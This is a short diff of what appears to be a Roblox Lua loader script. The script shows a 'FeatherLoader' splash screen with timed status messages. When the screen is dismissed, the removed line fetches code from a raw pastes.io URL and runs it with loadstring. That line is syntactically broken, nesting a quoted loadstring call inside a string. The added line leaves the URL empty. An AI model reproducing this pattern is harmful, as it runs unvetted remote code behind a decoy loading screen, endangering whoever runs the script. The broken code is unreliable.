@@ -292,6 +292,6 @@ task.delay(3.5, function() FeatherLoader:SetStatus("Almost ready...") end)
 
 task.delay(5, function()
     FeatherLoader:Dismiss(function()
-        loadstring(game:HttpGetAsync("loadstring(game:HttpGet("https://pastes.io/raw/EuUZ0dQF"))()"))()
+        loadstring(game:HttpGetAsync(""))()
     end)
 end)
